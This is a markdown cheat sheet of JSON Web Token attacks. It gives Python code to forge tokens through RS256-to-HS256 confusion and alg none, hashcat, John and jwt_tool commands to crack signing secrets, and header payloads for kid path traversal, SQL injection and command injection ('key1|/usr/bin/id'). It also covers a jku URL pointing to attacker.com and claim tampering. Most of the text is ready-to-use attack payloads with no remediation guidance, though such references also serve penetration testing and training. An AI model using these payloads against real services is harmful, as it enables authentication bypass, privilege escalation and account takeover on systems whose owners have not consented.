# JWT Attacks

## JWT Structure

```
header.payload.signature
(base64url).(base64url).(base64url)
```

```bash
# Decode header and payload
echo '<header>' | base64 -d
echo '<payload>' | base64 -d
# Or: jwt_tool <token>
```

## Algorithm Confusion (RS256 → HS256)

**When**: Server supports both RS256 and HS256. The public key is
known or obtainable.

**How**: Change `alg` to `HS256`, sign the token using the RSA
public key as the HMAC secret. Server verifies HMAC with the
public key (which it intended to use for RSA verification).

```python
import jwt
import json

public_key = open('public.pem', 'r').read()
payload = {"user": "admin", "role": "admin"}
token = jwt.encode(payload, public_key, algorithm='HS256')
```

```bash
# Using jwt_tool
jwt_tool <token> -X k -pk public.pem
```

## Algorithm None

**When**: Server accepts `alg: "none"` (no signature verification).

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user": "admin"}).encode()).rstrip(b'=')
token = header + b'.' + payload + b'.'  # empty signature
```

Variations: `"None"`, `"NONE"`, `"nOnE"`.

## Weak Secret Brute-Force

**When**: HMAC-signed JWT with a weak/common secret.

```bash
# hashcat (fastest)
hashcat -m 16500 '<full.jwt.token>' wordlist.txt

# jwt_tool
jwt_tool <token> -C -d wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
```

## KID (Key ID) Injection

### Path Traversal

**When**: `kid` header used to select a key file.

```json
{"alg": "HS256", "kid": "../../dev/null"}
```

Sign with empty string — `/dev/null` returns empty, HMAC
with empty key matches.

### SQL Injection

**When**: `kid` used in a database query.

```json
{"kid": "1' UNION SELECT 'my-secret-key' --"}
```

Sign with `my-secret-key`.

### Command Injection

```json
{"kid": "key1|/usr/bin/id"}
```

## JWK / JKU Header Injection

### JWK (JSON Web Key)

**When**: Server accepts `jwk` in the header to specify the
verification key inline.

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "<your-public-key-n>",
    "e": "AQAB"
  }
}
```

Sign with your own private key, embed your public key in the header.

### JKU (JWK Set URL)

**When**: Server fetches the key from a URL specified in `jku` header.

```json
{"alg": "RS256", "jku": "https://attacker.com/.well-known/jwks.json"}
```

Host your own JWKS at the specified URL with your public key.

## x5c / x5u Header Injection

Similar to JWK/JKU but using X.509 certificates:
- `x5c`: Embed a self-signed certificate chain in the header.
- `x5u`: Point to a URL hosting your certificate.

## Claim Manipulation

### Without Re-signing (if verification is weak)

- Change `"role": "user"` → `"role": "admin"`
- Change `"sub": "user123"` → `"sub": "admin"`
- Extend `"exp"` (expiration) to a future timestamp
- Remove `"exp"` claim entirely

### Token Replay

If tokens have no `jti` (unique ID) or `exp`, they can be
replayed indefinitely.

## JWE (Encrypted JWT)

**When**: Token is encrypted (five-part format with dots).

**Attacks**: If the public key is known and the algorithm is
RSA-OAEP, you can forge new encrypted tokens using the public
key (encryption is public-key operation).

## Tools

```bash
jwt_tool <token> -T                   # tamper mode (interactive)
jwt_tool <token> -X k -pk pub.pem     # key confusion attack
jwt_tool <token> -C -d wordlist.txt   # crack secret
jwt_tool <token> -X n                 # none algorithm attack
jwt_tool <token> -X i -hc kid -hv "../../dev/null"  # kid injection
```
